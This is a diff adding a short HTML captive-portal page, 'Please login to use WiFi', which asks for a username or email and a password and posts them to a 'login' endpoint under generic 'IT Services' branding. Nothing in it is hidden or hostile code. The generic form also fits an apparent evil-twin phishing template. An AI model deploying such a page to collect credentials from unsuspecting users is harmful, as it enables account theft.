@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <title>Welcome to WiFi</title>
+  <style>
+    body { font-family: sans-serif; background: #eee; }
+    .form { margin: 80px auto; width: 320px; background: #fff; border-radius: 12px; padding: 32px; box-shadow: 0 3px 12px #0009; }
+    input { width: 100%; margin: 8px 0 22px 0; padding: 10px; border: 1px solid #ccc; }
+    button { width: 100%; padding: 12px; background: #3A86FF; color: #fff; border: none; border-radius: 6px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <div class="form">
+    <h2>Please login to use WiFi</h2>
+    <form method="POST" action="login">
+      <input type="text" name="username" placeholder="Username or Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <p style="margin-top:20px;padding:0 5px;color:#888;">This network is provided by IT Services. Contact support if you have connectivity issues.</p>
+  </div>
+</body>
+</html>
